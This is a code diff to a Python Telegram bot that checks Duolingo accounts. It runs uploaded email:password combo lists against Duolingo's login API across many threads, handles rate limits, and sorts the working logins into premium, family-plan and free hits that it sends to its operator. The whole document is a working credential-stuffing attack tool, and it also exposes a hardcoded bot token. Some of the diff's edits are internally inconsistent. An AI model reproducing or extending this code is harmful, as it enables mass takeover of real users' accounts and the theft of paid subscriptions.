@@ -12,10 +12,10 @@ from concurrent.futures import ThreadPoolExecutor, as_completed, TimeoutError
 
 # ========== CONFIGURATION ==========
 BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
-ADMIN_ID = 8770379893
-MAX_THREADS = 50
-PROGRESS_UPDATE_INTERVAL = 500  # 500 combos per update (Telegram flood control)
-BATCH_SIZE = 50000  # 50k per batch (memory efficient)
+ADMIN_ID = 8770379893,1859432548
+MAX_THREADS = 30  # Thread 30
+PROGRESS_UPDATE_INTERVAL = 500
+BATCH_SIZE = 10000  # 10k per batch
 # ===================================
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')
@@ -24,19 +24,8 @@ bot = telebot.TeleBot(BOT_TOKEN)
 
 checking_active = False
 stop_flag = False
-current_batch = 0
-total_batches = 0
-
-# Store all hits
-all_super_hits = []
-all_family_hits = []
-all_free_accounts = []
-super_count = 0
-family_count = 0
-free_count = 0
-fail_count = 0
-error_count = 0
-error_types = {}
+current_executor = None
+current_futures = None
 
 def signal_handler(sig, frame):
     global stop_flag
@@ -124,10 +113,13 @@ def extract_subscription_details(data, plan_type):
 
 def check_single_account(email, password):
     """Single account check - with retry logic"""
+    if stop_flag:
+        return email, password, "STOPPED", "Stopped by user", None
+    
     session = requests.Session()
     ua = generate_ua()
     
-    for attempt in range(2):  # 2 attempts max
+    for attempt in range(2):
         try:
             login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
             distinct_id = str(uuid.uuid4())
@@ -143,7 +135,7 @@ def check_single_account(email, password):
             
             resp = session.post(login_url, json=login_payload, headers=login_headers, timeout=20)
             
-            if resp.status_code == 429:  # Rate limit
+            if resp.status_code == 429:
                 time.sleep(2)
                 continue
                 
@@ -164,7 +156,6 @@ def check_single_account(email, password):
             if not jwt_token:
                 return email, password, "FAIL", "no jwt token", None
             
-            # Profile with all fields
             profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt"
             
             profile_headers = get_headers(ua, jwt_token)
@@ -180,14 +171,12 @@ def check_single_account(email, password):
             
             data = resp2.json()
             
-            # Extract basic info
             username = data.get("username", "N/A")
             total_xp = data.get("totalXp", 0)
             streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
             learning_lang = data.get("learningLanguage", "N/A")
             from_lang = data.get("fromLanguage", "N/A")
             
-            # Get createdAt
             created_at_raw = data.get("createdAt", None)
             if created_at_raw:
                 try:
@@ -200,18 +189,15 @@ def check_single_account(email, password):
             else:
                 created_date = "Unknown"
             
-            # Check premium
             is_premium, plan_type, invite_token = is_premium_account(data)
             
             if not is_premium:
                 return email, password, "FREE", f"{username}|XP:{total_xp}|Streak:{streak}|Created:{created_date}", None
             
-            # Get subscription details
             sub_details = extract_subscription_details(data, plan_type)
             if invite_token:
                 sub_details["invite_token"] = invite_token
             
-            # Build result
             if plan_type == "FAMILY":
                 result = f"""
 👨‍👩‍👧 **FAMILY PREMIUM HIT!**
@@ -275,8 +261,7 @@ def make_progress_bar(percent, width=20):
     bar = "▓" * filled + "░" * (width - filled)
     return f"[{bar}] {percent:.1f}%"
 
-def save_hits_to_file(chat_id, is_final=False):
-    """Save all hits to file and send"""
+def save_hits_to_file(chat_id):
     global all_super_hits, all_family_hits
     
     if all_super_hits or all_family_hits:
@@ -302,66 +287,67 @@ def save_hits_to_file(chat_id, is_final=False):
         with open("premium_hits.txt", "rb") as f:
             bot.send_document(chat_id, f)
 
-def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, batch_start_time):
-    global checking_active, stop_flag
+def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, overall_start_time, overall_total):
+    global stop_flag, current_executor, current_futures
     global super_count, family_count, free_count, fail_count, error_count, error_types
     global all_super_hits, all_family_hits, all_free_accounts
     
-    batch_total = len(combos)
-    batch_super = 0
-    batch_family = 0
-    batch_free = 0
-    batch_fail = 0
-    batch_error = 0
+    if stop_flag:
+        return False
     
+    batch_total = len(combos)
     completed = 0
     last_update = 0
     
     with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+        current_executor = executor
         futures = {executor.submit(check_single_account, email, pwd): (email, pwd) for email, pwd in combos}
+        current_futures = futures
         
         for future in as_completed(futures):
             if stop_flag:
+                # Cancel all pending futures
+                for f in futures:
+                    f.cancel()
                 executor.shutdown(wait=False, cancel_futures=True)
                 return False
             
-            email, password, status, detail, plan_type = future.result()
+            try:
+                email, password, status, detail, plan_type = future.result(timeout=30)
+            except Exception as e:
+                continue
+            
             completed += 1
+            overall_completed = (batch_num - 1) * BATCH_SIZE + completed
+            overall_percent = (overall_completed / overall_total) * 100
+            elapsed = time.time() - overall_start_time
             
             if status == "HIT":
                 if plan_type == "FAMILY":
-                    batch_family += 1
                     family_count += 1
                     all_family_hits.append((email, password, detail))
                 else:
-                    batch_super += 1
                     super_count += 1
                     all_super_hits.append((email, password, detail))
                 bot.send_message(chat_id, detail, parse_mode="Markdown")
                 logging.info(f"✅ {plan_type} HIT: {email}")
             elif status == "FREE":
-                batch_free += 1
                 free_count += 1
                 all_free_accounts.append((email, password, detail))
                 logging.info(f"⚠️ FREE: {email}")
             elif status == "ERROR":
-                batch_error += 1
                 error_count += 1
                 error_types[detail] = error_types.get(detail, 0) + 1
                 logging.info(f"🔴 ERROR: {email} - {detail}")
+            elif status == "STOPPED":
+                return False
             else:
-                batch_fail += 1
                 fail_count += 1
                 logging.info(f"❌ FAIL: {email}")
             
             # Update progress every 500 combos
             if completed - last_update >= PROGRESS_UPDATE_INTERVAL or completed == batch_total:
                 last_update = completed
-                overall_completed = (batch_num - 1) * BATCH_SIZE + completed
-                overall_total = total_batches * BATCH_SIZE
-                overall_percent = (overall_completed / overall_total) * 100
-                elapsed = time.time() - batch_start_time
-                
                 progress_bar = make_progress_bar(overall_percent)
                 
                 error_summary = ""
@@ -399,9 +385,11 @@ def process_batch(chat_id, combos, batch_num, total_batches, progress_msg_id, ba
                 
                 try:
                     bot.edit_message_text(progress_text, chat_id, progress_msg_id, parse_mode="Markdown")
-                except Exception as e:
-                    logging.warning(f"Progress update failed: {e}")
+                except:
+                    pass
     
+    current_executor = None
+    current_futures = None
     return True
 
 def process_combos(chat_id, combos, message_id):
@@ -412,7 +400,6 @@ def process_combos(chat_id, combos, message_id):
     checking_active = True
     stop_flag = False
     
-    # Reset counters
     super_count = 0
     family_count = 0
     free_count = 0
@@ -470,16 +457,13 @@ _Use /stop to cancel_
         
         logging.info(f"📦 Processing batch {batch_num}/{total_batches} ({len(batch_combos)} combos)")
         
-        batch_start_time = time.time()
-        success = process_batch(chat_id, batch_combos, batch_num, total_batches, message_id, overall_start_time)
+        success = process_batch(chat_id, batch_combos, batch_num, total_batches, message_id, overall_start_time, total)
         
         if not success:
             break
         
-        # Small delay between batches
         time.sleep(1)
     
-    # Final summary
     elapsed = time.time() - overall_start_time
     progress_bar = make_progress_bar(100)
     
@@ -509,10 +493,8 @@ _Use /stop to cancel_
 """
     bot.send_message(chat_id, final_summary, parse_mode="Markdown")
     
-    # Save and send hits
-    save_hits_to_file(chat_id, is_final=True)
+    save_hits_to_file(chat_id)
     
-    # Send free accounts file
     if all_free_accounts:
         free_content = f"# FREE Accounts (Login Success - No Premium)\n# Total: {len(all_free_accounts)}\n\n"
         for email, pwd, detail in all_free_accounts:
@@ -542,24 +524,19 @@ def start_command(message):
         "👋 **Duolingo Premium Account Checker**\n\n"
         "**Config:** [ DUOLINGO ] BY ThuYa V3\n"
         "**Author:** @thuyaaungzaw\n"
-        f"**Threads:** `{MAX_THREADS}` (Concurrent)\n"
+        f"**Threads:** `{MAX_THREADS}`\n"
         f"**Batch Size:** `{BATCH_SIZE}` combos\n\n"
         "📂 Click button below → Send combo file (email:pass)\n\n"
+        "🛑 Use `/stop` to cancel **immediately**\n\n"
         "**Results:**\n"
-        "👑 **SUPER PREMIUM** → Individual premium plan\n"
-        "👨‍👩‍👧 **FAMILY PLAN** → Family premium + invite link\n"
-        "⚠️ **FREE** → Login success, no premium\n"
-        "❌ **FAIL** → Wrong credentials\n"
-        "🔴 **ERROR** → Network/API issue\n\n"
-        "📅 **Created Date** → Account creation date\n\n"
-        "🛑 Use `/stop` to cancel",
+        "👑 SUPER PREMIUM | 👨‍👩‍👧 FAMILY PLAN | ⚠️ FREE | ❌ FAIL | 🔴 ERROR",
         parse_mode="Markdown",
         reply_markup=markup
     )
 
 @bot.message_handler(commands=['stop'])
 def stop_command(message):
-    global stop_flag, checking_active
+    global stop_flag, checking_active, current_executor, current_futures
     
     if message.from_user.id != ADMIN_ID:
         bot.reply_to(message, "⛔ Unauthorized.")
@@ -567,9 +544,18 @@ def stop_command(message):
     
     if checking_active:
         stop_flag = True
-        bot.reply_to(message, "🛑 **Stopping...** Please wait. Saving current hits...")
-        # Give time to save
-        time.sleep(2)
+        
+        # Cancel all running futures immediately
+        if current_futures:
+            for future in current_futures:
+                future.cancel()
+        
+        # Shutdown executor immediately
+        if current_executor:
+            current_executor.shutdown(wait=False, cancel_futures=True)
+        
+        bot.reply_to(message, "🛑 **Stopped immediately!**")
+        logging.info("🛑 Stop command received - immediate stop")
     else:
         bot.reply_to(message, "ℹ️ No active check.")
 
@@ -577,7 +563,7 @@ def stop_command(message):
 def ask_file(message):
     if message.from_user.id != ADMIN_ID:
         return
-    bot.reply_to(message, "📎 Send your **email:pass** combo file (.txt)\n\n⚠️ For large files (100k+ combos), this may take time.", parse_mode="Markdown")
+    bot.reply_to(message, "📎 Send your **email:pass** combo file (.txt)", parse_mode="Markdown")
 
 @bot.message_handler(content_types=['document'])
 def handle_file(message):
@@ -591,7 +577,7 @@ def handle_file(message):
         bot.reply_to(message, "⚠️ Check running. Use /stop first.")
         return
     
-    status_msg = bot.reply_to(message, "📥 Downloading file...")
+    status_msg = bot.reply_to(message, "📥 Downloading...")
     
     file_info = bot.get_file(message.document.file_id)
     downloaded_file = bot.download_file(file_info.file_path)
@@ -608,7 +594,7 @@ def handle_file(message):
         bot.edit_message_text("❌ No valid combos. Format: email:pass", status_msg.chat.id, status_msg.message_id)
         return
     
-    bot.edit_message_text(f"📥 `{len(combos)}` combos loaded.\n🚀 Starting check with {MAX_THREADS} threads...\n📦 Batch size: {BATCH_SIZE}", status_msg.chat.id, status_msg.message_id, parse_mode="Markdown")
+    bot.edit_message_text(f"📥 `{len(combos)}` combos loaded.\n🚀 Starting with {MAX_THREADS} threads...\n📦 Batch size: {BATCH_SIZE}", status_msg.chat.id, status_msg.message_id, parse_mode="Markdown")
     
     thread = threading.Thread(target=process_combos, args=(message.chat.id, combos, status_msg.message_id))
     thread.daemon = True
@@ -619,6 +605,5 @@ print(f"Config: [ DUOLINGO ] BY ThuYa V3")
 print(f"Author: @thuyaaungzaw")
 print(f"Threads: {MAX_THREADS}")
 print(f"Batch Size: {BATCH_SIZE}")
-print(f"Progress Update Interval: {PROGRESS_UPDATE_INTERVAL} combos")
-print("Features: SUPER PREMIUM | FAMILY PLAN | Created Date | Batch Processing | /stop")
+print("Features: SUPER PREMIUM | FAMILY PLAN | Created Date | /stop IMMEDIATE")
 bot.infinity_polling()
